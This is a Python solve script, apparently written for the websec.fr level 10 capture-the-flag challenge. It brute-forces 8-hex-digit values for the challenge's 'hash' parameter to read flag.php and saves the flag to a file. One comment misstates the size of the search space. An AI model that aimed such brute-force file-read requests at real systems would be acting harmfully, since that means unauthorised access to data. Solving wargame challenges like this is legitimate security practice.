#!/usr/bin/env python3
import requests
import string
import time

url = "https://websec.fr/level10/index.php"

# Bruteforce del hash - solo 8 caracteres hex
print("Iniciando bruteforce del hash (8 chars hex = 4 billones de combinaciones)")
print("Probando primero valores pequeños y patrones comunes...\n")

# Probar primero valores comunes
common_hashes = []

# Hashes que empiezan con 0
for i in range(0, 1000):
    common_hashes.append(f"{i:08x}")

# Hashes con patrones
for c in "0123456789abcdef":
    common_hashes.append(c * 8)
    for c2 in "0123456789abcdef":
        common_hashes.append((c + c2) * 4)

# Eliminar duplicados
common_hashes = list(set(common_hashes))

print(f"Probando {len(common_hashes)} hashes comunes primero...")

for i, hash_val in enumerate(common_hashes):
    if i % 100 == 0:
        print(f"Progreso: {i}/{len(common_hashes)} - Probando: {hash_val}")
    
    try:
        r = requests.get(url, params={"f": "flag.php", "hash": hash_val}, timeout=3)
        
        if "WEBSEC{" in r.text:
            flag_start = r.text.find("WEBSEC{")
            flag_end = r.text.find("}", flag_start)
            flag = r.text[flag_start:flag_end+1]
            print(f"\n¡¡¡FLAG ENCONTRADA!!!")
            print(f"FLAG: {flag}")
            print(f"Hash: {hash_val}")
            with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                f.write(f"FLAG: {flag}\nHash: {hash_val}\n")
            exit(0)
        
        if i % 100 == 0:
            time.sleep(0.1)  # Rate limiting
    except:
        continue

print("No encontrado en hashes comunes. Necesito más tiempo para bruteforce completo...")